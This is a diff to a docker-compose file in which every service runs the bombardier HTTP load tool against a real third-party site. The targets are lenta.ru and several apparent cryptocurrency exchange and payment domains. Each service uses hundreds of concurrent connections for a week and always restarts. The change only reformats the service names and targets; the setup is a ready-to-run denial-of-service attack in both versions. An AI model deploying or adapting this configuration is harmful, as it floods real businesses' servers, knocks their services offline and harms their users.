@@ -7,56 +7,56 @@ services:
     restart: always
     command: -c 500 -d 604800s -l lenta.ru
 
-  https://cleanbtc.ru:
-    container_name: https://cleanbtc.ru
+  cleanbtc.ru:
+    container_name: cleanbtc.ru
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://cleanbtc.ru
+    command: -c 200 -d 604800s -l cleanbtc.ru
 
-  https://bonkypay.com:
-    container_name: https://bonkypay.com
+  bonkypay.com:
+    container_name: bonkypay.com
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://bonkypay.com
+    command: -c 200 -d 604800s -l bonkypay.com
 
-  https://changer.club:
-    container_name: https://changer.club
+  changer.club:
+    container_name: changer.club
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://changer.club
+    command: -c 200 -d 604800s -l changer.club
 
-  https://superchange.net:
-    container_name: https://superchange.net
+  superchange.net:
+    container_name: superchange.net
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://superchange.net
+    command: -c 200 -d 604800s -l superchange.net
 
-  https://mine.exchange:
-    container_name: https://mine.exchange
+  mine.exchange:
+    container_name: mine.exchange
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://mine.exchange
+    command: -c 200 -d 604800s -l mine.exchange
 
-  https://platov.co:
-    container_name: https://platov.co
+  platov.co:
+    container_name: platov.co
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://platov.co
+    command: -c 200 -d 604800s -l platov.co
 
-  https://ww-pay.net:
-    container_name: https://ww-pay.net
+  ww-pay.net:
+    container_name: ww-pay.net
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://ww-pay.net
+    command: -c 200 -d 604800s -l ww-pay.net
 
-  https://delets.cash:
-    container_name: https://delets.cash
+  delets.cash:
+    container_name: delets.cash
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://delets.cash
+    command: -c 200 -d 604800s -l delets.cash
 
-  https://betatransfer.org:
-    container_name: https://betatransfer.org
+  betatransfer.org:
+    container_name: betatransfer.org
     image: alpine/bombardier
     restart: always
-    command: -c 200 -d 604800s -l https://betatransfer.org
+    command: -c 200 -d 604800s -l betatransfer.org
